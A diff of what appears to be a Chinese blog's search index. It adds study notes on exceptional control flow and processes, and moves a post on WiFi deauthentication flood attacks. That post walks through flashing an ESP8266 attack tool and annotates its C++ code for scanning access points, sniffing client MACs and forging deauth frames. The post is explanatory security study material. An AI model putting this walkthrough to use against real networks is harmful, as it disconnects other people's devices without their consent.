-<h2 id="802-11协议"><a href="#802-11协议" class="headerlink" title="802.11协议"></a>802.11协议</h2><img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/7.png" class="">
-
-<p>以上是我们需要构造的mac帧头格式</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/8.png" class="">
-
-<p>准确的说，我们需要向设备发送取消验证包。地址1应该是DA（设备mac），地址2是BSSID（伪造成APmac），地址3源地址（还是APmac）</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#attack.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Attack::deauthDevice</span><span class="params">(<span class="keyword">uint8_t</span>* apMac, <span class="keyword">uint8_t</span>* stMac, <span class="keyword">uint8_t</span> reason, <span class="keyword">uint8_t</span> ch)</span> </span>&#123;</span><br><span class="line">	······</span><br><span class="line">    <span class="comment">// build deauth packet</span></span><br><span class="line">    packetSize = <span class="keyword">sizeof</span>(deauthPacket);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> deauthpkt[packetSize];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(deauthpkt, deauthPacket, packetSize);<span class="comment">//构造mac帧头，初始数据见下</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">4</span>], stMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">10</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">16</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    deauthpkt[<span class="number">24</span>] = reason;</span><br><span class="line">    ······</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#attack.h</span></span><br><span class="line"><span class="keyword">uint8_t</span> deauthPacket[<span class="number">26</span>] = &#123;</span><br><span class="line">            <span class="comment">/*  0 - 1  */</span> <span class="number">0xC0</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="comment">/*  2 - 3  */</span> <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">            <span class="comment">/*  4 - 9  */</span> <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="comment">/* 10 - 15 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 16 - 21 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 22 - 23 */</span> <span class="number">0x00</span>, <span class="number">0x00</span>,                         </span><br><span class="line">            <span class="comment">/* 24 - 25 */</span> <span class="number">0x01</span>, <span class="number">0x00</span>                         </span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>软件安全</category>
-      </categories>
-  </entry>
-  <entry>
     <title>文件管理</title>
     <url>/2022/01/03/%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/</url>
     <content><![CDATA[<h1 id="生磁盘的使用"><a href="#生磁盘的使用" class="headerlink" title="生磁盘的使用"></a>生磁盘的使用</h1><h2 id="最直接的使用磁盘"><a href="#最直接的使用磁盘" class="headerlink" title="最直接的使用磁盘"></a>最直接的使用磁盘</h2><img src="/2022/01/03/%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/1.png" class="">
@@ -1359,6 +1312,311 @@
 ]]></content>
       <categories>
         <category>操作系统</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>无线DOS之取消验证洪水攻击</title>
+    <url>/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>​    取消验证洪水攻击，全程为De-authenticationFloodAttack,简称为Deauth攻击。首先，攻击者通过扫描周围的WIFI网络，获取WIFI站点的SSID。然后扫描连接周围连接该网络的设备。最后，对周边网络进行抓包（嗅探），寻找要攻击的WIFI站点和连接该站点的设备，以获取的包头信息重新构造一个取消验证包，发给连接设备。设备会被欺骗，从而取消对AP的连接。</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/0.png" class="">
+
+<h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>​    参考已有的张馆长的工程，将其烧录到esp8266模块上。<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1.jpg" class=""></p>
+<p>简单配置一下</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/2.jpg" class="">
+
+<p>烧录</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/3.jpg" class="">
+
+<p>这时，esp8266会建立一个WIFI，</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/4.jpg" class="">
+
+<p>我们连接这个wifi，进入192.168.4.1，可以看到攻击界面，里面会显示当前的AP，我们选取一个作为攻击对象。这里我们设置的是无差别攻击。当我们要定点攻击时，需要扫描连接该WiFi的设备，选择一个攻击。</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/5.jpg" class="">
+
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/6.jpg" class="">
+
+<p>​        选择Deauth攻击，然后我们就可以观察到连接该网的设备断连的现象，手机上方的WiFi图标会不断闪烁。</p>
+<h1 id="代码架构"><a href="#代码架构" class="headerlink" title="代码架构"></a>代码架构</h1><p>首先，WIFI模块有两种工作模式：</p>
+<p>ap是无线发射端，station是接收端，两种模式组建成一个无线局域网。</p>
+<ol>
+<li>ap mode 通常应用在无线局域网成员设备（即客户端）的加入，即<strong>网络下行</strong>。它提供以无线方式组建无线局域网 WLAN，相当际 <strong>WLAN 的中心设备</strong>。AP和AP之间允许相互连接。</li>
+<li>station mode即工作站模式，可以理解为某个网格中的一个工作站即<strong>客户端</strong>，<strong>网络上行</strong>。那当一个 WIFI 芯片提供这个功能时，它就可以连到另外的一个网络当中，如家用路由器。通常用于提供网络的数据上行服务。</li>
+</ol>
+<p>代码的核心是扫描、嗅探和伪造。扫描站点，嗅探（抓包）和通过。</p>
+<p>首先是扫描：</p>
+<p>​    AP模式扫描周围的AP。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line">	<span class="comment">/* AP Scan */</span></span><br><span class="line">    <span class="keyword">if</span> ((mode == SCAN_MODE_APS) || (mode == SCAN_MODE_ALL)) &#123;</span><br><span class="line">        <span class="comment">// remove old results</span></span><br><span class="line">        accesspoints.removeAll();</span><br><span class="line">        stations.removeAll();</span><br><span class="line">        <span class="comment">// start AP scan</span></span><br><span class="line">        prntln(SC_START_AP);</span><br><span class="line">        WiFi.scanNetworks(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">/*该函数可以扫描到ESP8266开发板所在环境中的可用WIFI网络，并且将WiFi网络信息保存到内存中。通过调用SSID、RSSI等函数，我们还可以得到这些扫描到的WIFI的更多信息。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    station模式开启后可以开启混杂模式（混杂模式（英语：promiscuous mode）是电脑网络中的术语。是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。），从而为嗅探作准备</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line"><span class="comment">/* Station Scan */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (mode == SCAN_MODE_STATIONS) &#123;</span><br><span class="line">        <span class="comment">// start station scan</span></span><br><span class="line">        <span class="keyword">if</span> (accesspoints.count() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            start(SCAN_MODE_ALL);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="comment">//如果当前网络没有AP,返回重新扫描，因为我们需要先确定攻击的AP再确定攻击的设备，如果在嗅探前AP已经不存在了，则没有继续的必要</span></span><br><span class="line">        snifferStartTime = currentTime;</span><br><span class="line">        prnt(SC_START_CLIENT);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sniffTime &gt; <span class="number">0</span>) prnt(String(sniffTime / <span class="number">1000</span>) + S);</span><br><span class="line">        <span class="keyword">else</span> prnt(SC_INFINITELY);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!channelHop) &#123;</span><br><span class="line">            prnt(SC_ON_CHANNEL);</span><br><span class="line">            prnt(wifi_channel);</span><br><span class="line">        &#125;</span><br><span class="line">        prntln();</span><br><span class="line">        wifi::stopAP();</span><br><span class="line">        wifi_promiscuous_enable(<span class="literal">true</span>);<span class="comment">//开启混杂模式</span></span><br><span class="line">    	<span class="comment">/*混杂模式就是接收所有经过网卡的数据包，包括不是发给本机的包。默认情况下网卡只把发给本机的包（包括广播包）传递给上层程序，其它的包一律丢弃。但是混杂模式就是指网卡能接受所有通过它的数据流，不管是什么格式，什么地址的。事实上，计算机收到数据包后，由网络层进行判断（这里是802.11系协议），确定是递交上层（传输层），还是丢弃，还是递交下层（数据链路层、MAC子层）转发。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入嗅探模式：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Scan::sniffer</span><span class="params">(<span class="keyword">uint8_t</span>* buf, <span class="keyword">uint16_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!isSniffing()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    packets++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">28</span>) <span class="keyword">return</span>;  <span class="comment">// 丢弃掉过短的数据包</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0xc0</span>) || (buf[<span class="number">12</span>] == <span class="number">0xa0</span>)) &#123;</span><br><span class="line">        tmpDeauths++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 丢弃信标帧、探测请求/响应和解除授权/解除关联帧</span></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0x80</span>) || (buf[<span class="number">12</span>] == <span class="number">0x40</span>) || (buf[<span class="number">12</span>] == <span class="number">0x50</span>) <span class="comment">/* || buf[12] == 0xc0 || buf[12] == 0xa0*/</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只允许数据帧</span></span><br><span class="line">    <span class="comment">// if(buf[12] != 0x08 &amp;&amp; buf[12] != 0x88) return;数据帧12位为08和88的时候说明是数据帧，如果都不是，可以丢弃，但作者将这句话注释了，不知道原因。。。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>* macTo   = &amp;buf[<span class="number">16</span>];<span class="comment">//该数据包要去哪</span></span><br><span class="line">    <span class="keyword">uint8_t</span>* macFrom = &amp;buf[<span class="number">22</span>];<span class="comment">//该数据包从哪来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (macBroadcast(macTo) || macBroadcast(macFrom) || !macValid(macTo) || !macValid(macFrom) || macMulticast(macTo) ||</span><br><span class="line">        macMulticast(macFrom)) <span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//Broadcast所谓广播地址指同时向网上所有的主机发送报文，也就是说，不管物理网络特性如何，internet网都支持广播传输。这里表示如果收发地址为广播地址，则丢弃。</span></span><br><span class="line">    <span class="comment">//Multicast是一个群组传播模式。。。其他的看不懂了，和上面区别不大。也丢弃。</span></span><br><span class="line">    <span class="comment">//上面两种的特点都是一对多模式，而我们只需要要截获一对一的数据包，并认为该mac为有效mac地址。</span></span><br><span class="line">    <span class="keyword">int</span> accesspointNum = findAccesspoint(macFrom);<span class="comment">//查看该mac地址有几个AP。这个如果小于0说明该mac地址是连接AP的设备</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        stations.add(macTo, accesspoints.getID(accesspointNum));</span><br><span class="line">        <span class="comment">//macForm为AP了，那么macTo肯定为设备，我们将该设备的mac加入列表。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  <span class="comment">//如果AP数量为0，那么macTo是AP，macForm为设备，</span></span><br><span class="line">        accesspointNum = findAccesspoint(macTo);</span><br><span class="line">        <span class="comment">//这两个if判断谁是AP谁是设备，写的很垃圾</span></span><br><span class="line">        <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            stations.add(macFrom, accesspoints.getID(accesspointNum));</span><br><span class="line">            <span class="comment">//我们将该设备的mac加入列表。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="802-11协议"><a href="#802-11协议" class="headerlink" title="802.11协议"></a>802.11协议</h2><img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/7.png" class="">
+
+<p>以上是我们需要构造的mac帧头格式</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/8.png" class="">
+
+<p>准确的说，我们需要向设备发送取消验证包。地址1应该是DA（设备mac），地址2是BSSID（伪造成APmac），地址3源地址（还是APmac）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#attack.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Attack::deauthDevice</span><span class="params">(<span class="keyword">uint8_t</span>* apMac, <span class="keyword">uint8_t</span>* stMac, <span class="keyword">uint8_t</span> reason, <span class="keyword">uint8_t</span> ch)</span> </span>&#123;</span><br><span class="line">	······</span><br><span class="line">    <span class="comment">// build deauth packet</span></span><br><span class="line">    packetSize = <span class="keyword">sizeof</span>(deauthPacket);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> deauthpkt[packetSize];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(deauthpkt, deauthPacket, packetSize);<span class="comment">//构造mac帧头，初始数据见下</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">4</span>], stMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">10</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">16</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    deauthpkt[<span class="number">24</span>] = reason;</span><br><span class="line">    ······</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#attack.h</span></span><br><span class="line"><span class="keyword">uint8_t</span> deauthPacket[<span class="number">26</span>] = &#123;</span><br><span class="line">            <span class="comment">/*  0 - 1  */</span> <span class="number">0xC0</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="comment">/*  2 - 3  */</span> <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">            <span class="comment">/*  4 - 9  */</span> <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="comment">/* 10 - 15 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 16 - 21 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 22 - 23 */</span> <span class="number">0x00</span>, <span class="number">0x00</span>,                         </span><br><span class="line">            <span class="comment">/* 24 - 25 */</span> <span class="number">0x01</span>, <span class="number">0x00</span>                         </span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>软件安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>深入理解计算机系统三</title>
+    <url>/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/</url>
+    <content><![CDATA[<h2 id="第八章：异常控制流"><a href="#第八章：异常控制流" class="headerlink" title="第八章：异常控制流"></a>第八章：异常控制流</h2><p><strong>控制流：</strong></p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/78.png" class="">
+
+<h4 id="8-1-异常"><a href="#8-1-异常" class="headerlink" title="8.1 异常"></a>8.1 异常</h4><p>​    异常是异常控制流的一种形式，一部分由硬件实现，一部分由操作系统实现，这一节中主要是对异常和异常处理有一个一般性的了解。异常就是控制流中的突变，用来相应处理器状态中的某些变化。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/79.png" class="">
+
+<p>在任何情况下，当处理器检测到有事件发生，会通过一张叫<strong>异常表</strong>的跳转表，进行一个间接过程调用（异常），到一个专门设计用来处理这类时间的操作系统子程序（<strong>异常处理程序</strong>）。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/80.png" class="">
+
+<p>当异常处理程序完成以后，根据引起异常的事件类型会发生以下三种情况的一种：</p>
+<ol>
+<li><p>处理程序将控制返回给当前的指令Icurr，即当事件发生时正在执行的指令。</p>
+</li>
+<li><p>处理程序将控制返回给Inext，如果没有发生异常将会执行的下一条指令。</p>
+</li>
+<li><p>处理程序终止被中断的程序。</p>
+</li>
+</ol>
+<h5 id="8-1-1-异常处理"><a href="#8-1-1-异常处理" class="headerlink" title="8.1.1 异常处理"></a>8.1.1 异常处理</h5><p>系统中为每种类型的异常分配了唯一的非负整数的异常号，一些是处理器的设计者分配的，其他是操作系统内核设计者分配的。</p>
+<ul>
+<li>​    前者包括被0除，缺页，内存访问违例，断点及算术溢出。</li>
+<li>​    后者包括系统调用和来自外部IO设备的信号。</li>
+</ul>
+<p>系统启动时，会初始化一张异常表的跳转表，使条目k包含异常k的处理程序地址。</p>
+<p>在运行时，处理器检测到发生了一个事件，并确定了相应的<strong>异常号</strong>k，随后，处理器触发异常，方法是执行间接过程调用，通过异常表的条目k转到相应的处理程序。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/80.png" class="">
+
+<p>异常表的起始地址放在一个叫做<strong>异常表基质寄存器</strong>的特殊CPU寄存器中。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/81.png" class="">
+
+<p>异常处理过程类似于调用但有一些不同：</p>
+<ul>
+<li>过程调用时，在跳转到处理程序之前，处理器将返回地址压入栈中，然而根据异常的类型，返回地址要么是当前指令，要么是下一条指令。</li>
+<li>处理器也把一些额外的处理器状态压入栈里，在处理程序返回时，重新开始执行被中断的程序可能会需要这些状态。</li>
+<li>如果控制从用户程序转移到内核，所有这些项目都被压入栈中，而不是用户栈中。</li>
+<li>异常处理程序运行在内核模式下，意味着它们对所有的系统资源都有完全的访问权限。</li>
+</ul>
+<h5 id="8-1-2-异常的类型"><a href="#8-1-2-异常的类型" class="headerlink" title="8.1.2 异常的类型"></a>8.1.2 异常的类型</h5><p>异常可以分为四类：中断、陷阱、故障、终止。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/84.jpg" class="">
+
+<p><strong>中断：</strong></p>
+<p>中断是<strong>异步</strong>发生的，来自处理器外部的I/O设备的信号的结果。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/82.png" class="">
+
+<p>在当前指令完成执行之后，处理器注意到中断引脚的电压变高了，就从系统总线读取异常号，然后调用适当的中断程序。当处理程序返回时，它就将控制返回给下一条指令。结果就好像程序继续执行，好像没有发生过中断一样。</p>
+<p>剩下的异常类型（陷阱、故障和终止）是同步执行的，是执行当前指令的结果，我们把这类指令叫做<strong>故障指令</strong>。</p>
+<p><strong>陷阱和系统调用:</strong></p>
+<p>陷阱是有意的异常，是执行一条指令的结果。</p>
+<p>陷阱最重要的用途是在用户程序和内核之间提供一个像过程一样的接口，叫做<strong>系统调用</strong>。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/82.5.png" class="">
+
+<p>​    用户程序经常需要向内核请求服务。为了允许对这些服务的受控访问，处理器提供了一条特殊的“syscall n”指令，当用户程序想要请求服务n时，可以执行这条指令。执行syscall指令会导致一个到异常处理程序的陷阱，这个 处理程序解析参数，并调用适当的内核程序。</p>
+<p>​    函数调用是在用户模式，系统调用在内核模式。</p>
+<p><strong>故障和终止：</strong></p>
+<p>故障是由错误情况引起的，它可能被故障处理程序修正。如果被修正，则将控制转移到当前指令。</p>
+<p>如果不可修正，则终止，终止处理程序不会将控制返回给应用程序。将返回一个abort例程，该例程将终止程序。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/83.png" class="">
+
+<h5 id="8-1-3-Linux-x86-64系统中的异常"><a href="#8-1-3-Linux-x86-64系统中的异常" class="headerlink" title="8.1.3 Linux/x86-64系统中的异常"></a>8.1.3 Linux/x86-64系统中的异常</h5><img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/85.png" class="">
+
+<ol>
+<li><p><strong>Linux/x86-64故障和终止：</strong></p>
+<ul>
+<li>除法错误。</li>
+<li>一般保护故障。通常是一个程序引用了一个未定义的虚拟内存空间，或者程序试图写一个只读的文本。Linux shell一般报告为“段故障”</li>
+<li>缺页是会重新执行产生故障的指令的一个异常示例。</li>
+<li>机器检查。机器检查是在导致故障的指令执行中检查到致命的硬件错误时发生的。</li>
+</ul>
+</li>
+<li><p><strong>Linux/x86-64系统调用：</strong></p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/86.png" class=""></li>
+</ol>
+<h4 id="8-2-进程"><a href="#8-2-进程" class="headerlink" title="8.2 进程"></a>8.2 进程</h4><p>​    在现代操作系统上运行一个程序时，会得到一个假象，就好像程序时目前系统中唯一的程序，程序似乎独占处理器和内存等等假象都通过进程的概念提供给我们的。</p>
+<pre><code> 进程提供给应用程序的关键抽象：
+</code></pre>
+<ul>
+<li>一个独立的逻辑控制流，它提供一个假象，好像我们的程序独占的使用处理器。</li>
+<li>一个私有的地址空间，提供一个假象，好像我们的程序独占的使用内存系统。</li>
+</ul>
+<h5 id="8-2-1-逻辑控制流"><a href="#8-2-1-逻辑控制流" class="headerlink" title="8.2.1 逻辑控制流"></a>8.2.1 逻辑控制流</h5><p>​    即使在系统中通常有许多其他程序在运行，进程也可以像每个程序提供一种假象，好像它在独占的使用处理器，如果想用调试器单步执行程序，会看到一系列PC值，这些值唯一的对应包含在程序的可执行目标文件中的指令，或是包含在运行时动态连接到程序的共享对象的指令，这个PC值的序列叫做<strong>逻辑控制流</strong>。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/87.png" class="">
+
+<h5 id="8-2-2-并发流"><a href="#8-2-2-并发流" class="headerlink" title="8.2.2 并发流"></a>8.2.2 并发流</h5><p>计算机系统中逻辑流有许多不同形式，异常处理程序、进程、信号处理程序、线程等都是逻辑流的例子。</p>
+<p>一个逻辑流的执行在时间上与另一个流重叠，称为<strong>并发流</strong>。</p>
+<p>时间片：一个进程执行它的控制流的一部分的每一时间段。</p>
+<p>多任务：一个进程和其他进程轮流运行（也叫时间分片）</p>
+<p>并发：多个流并发执行的一般现象。</p>
+<p>并行流：两个流并发的运行在不同的处理机核或者计算机上，它们并行地运行。</p>
+<h5 id="8-2-3-私有地址空间"><a href="#8-2-3-私有地址空间" class="headerlink" title="8.2.3 私有地址空间"></a>8.2.3 私有地址空间</h5><p>私有地址空间—进程为程序提供的假象，好像它独占的使用系统地址空间。一般而言，和这个空间中某个地址相关联的那个存储器字节是不能被其他进程读写的。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/88.png" class="">
+
+<h5 id="8-2-4-用户模式和内核模式"><a href="#8-2-4-用户模式和内核模式" class="headerlink" title="8.2.4 用户模式和内核模式"></a>8.2.4 用户模式和内核模式</h5><p>​    处理器提供一种机制，限制一个应用可以执行的指令以及它可以访问的地址空间范围。通常是通过控制某个寄存器的模式位来提供这种功能，该寄存器描述了进程当前享有的特权。</p>
+<ul>
+<li>​    设置模式位之后，进程出域内核模式，也叫做超级用户模式，这个进程可以执行指令集中的任何指令，并且可以访问系统中的任何内存位置。</li>
+<li>​    没有设置模式位，进程运行在用户模式，用户模式中的进程不允许执行特权指令，比如停止处理器、改变模式位、发起IO操作、不允许引用地址空间中内核区的代码和数据，这样的尝试都会引起故障。用户程序必须通过系统调用接口间接的访问内核代码和数据。</li>
+</ul>
+<p> linux提供了一种机制，叫做/proc文件系统，允许用户模式进程访问内核数据结构中的内容。</p>
+<p>/proc文件系统将许多内核数据的内容输出为一个用户程序可以读的文本文件的层次结构。</p>
+<h5 id="8-2-5-上下文切换"><a href="#8-2-5-上下文切换" class="headerlink" title="8.2.5 上下文切换"></a>8.2.5 上下文切换</h5><p>​    操作系统内核使用一种称为上下文切换的较高层次的异常控制流来实现多任务。上下文切换机制是建立在上面讨论过的低层的异常机制上的。</p>
+<p>​    内核为每个进程维持一个<strong>上下文</strong>，上下文就是内核重新启动一个被抢占的进程所需要的状态，由一些对象的值组成，包括通用目的寄存器、浮点寄存器、程序计数器、用户栈、状态寄存器、内存栈和各种内核数据结构，比如描述地址空间的页表、包含当前进程信息的进程表，以及包含进程已打开文件的信息的文件表。</p>
